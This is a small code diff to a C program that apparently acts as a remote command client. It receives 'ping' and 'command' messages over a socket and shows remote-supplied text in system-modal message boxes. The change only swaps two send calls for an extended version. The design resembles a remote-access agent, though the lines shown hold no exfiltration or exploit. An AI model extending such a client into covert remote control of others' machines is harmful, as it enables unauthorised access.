@@ -35,7 +35,7 @@ void handle_command(void* arg) {
     char* cmd = ca->cmd;
 
     if (strcmp(cmd, "ping") == 0) {
-        sock_send(g_sock, g_send_mutex, "pong");
+        sock_send_ex(g_sock, g_send_mutex, "pong", "");
     } else if (strncmp(cmd, "[msg] ", 6) == 0) {
         MessageBoxA(NULL, cmd + 6, "Message", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
         sock_send(g_sock, g_send_mutex, "ok");
@@ -207,7 +207,7 @@ int main() {
                                 cJSON* type = cJSON_GetObjectItem(msg, "type");
                                 cJSON* payload = cJSON_GetObjectItem(msg, "payload");
                                 if (type && strcmp(type->valuestring, "ping") == 0) {
-                                    sock_send(g_sock, g_send_mutex, "pong");
+                                    sock_send_ex(g_sock, g_send_mutex, "pong", "");
                                 } else if (type && strcmp(type->valuestring, "command") == 0 && payload) {
                                     char* cmd_val = payload->valuestring;
 
